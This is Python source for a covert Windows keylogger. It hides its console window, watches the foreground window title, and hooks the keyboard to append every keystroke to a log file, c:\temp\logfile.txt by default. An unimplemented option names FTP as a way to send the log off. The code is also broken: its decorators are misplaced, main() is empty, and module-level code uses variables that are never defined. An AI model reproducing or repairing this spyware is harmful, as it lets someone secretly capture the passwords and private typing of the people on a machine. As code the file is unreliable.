import pyHook, pythoncom, time, click, win32console,win32gui


@click.command()
@click.option('--file', '-f', default="c:\\temp\logfile.txt", help="File to output keystrokes to (if running local), "
                                                                   "defaults to c:\\temp\\logfile.txt")
@click.option('--mode', '-m', default="local", help="Where to send log, defaults to local, options are local, ftp, ")

#Hide Console
def hide():
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window,0)
    return True

def get_window():
    windowTile = "";
    while (True):
        newWindowTile = win32gui.GetWindowText(win32gui.GetForegroundWindow());
        if (newWindowTile != windowTile):
            windowTile = newWindowTile;
            print(windowTile);


def main(file):
    hide()
    x = time.ctime()
    data = ''



with open(file, "a") as f:
    f.write("\n")
    f.write("[" + x + "] : ")

def on_keyboard_event(event):
    global x, data
    if event.Key == "Return":
        with open(file, "a") as f:
            f.write(" {Enter}\n")
    elif event.Key == "Space":
        with open(file, "a") as f:
            f.write(" ")
    elif event.Key == "Back":
        with open(file, "a") as f:
            f.write("{Bkspc}")
    else:
        with open(file, "a") as f:
            f.write(event.Key)
    return True

hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = on_keyboard_event
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()


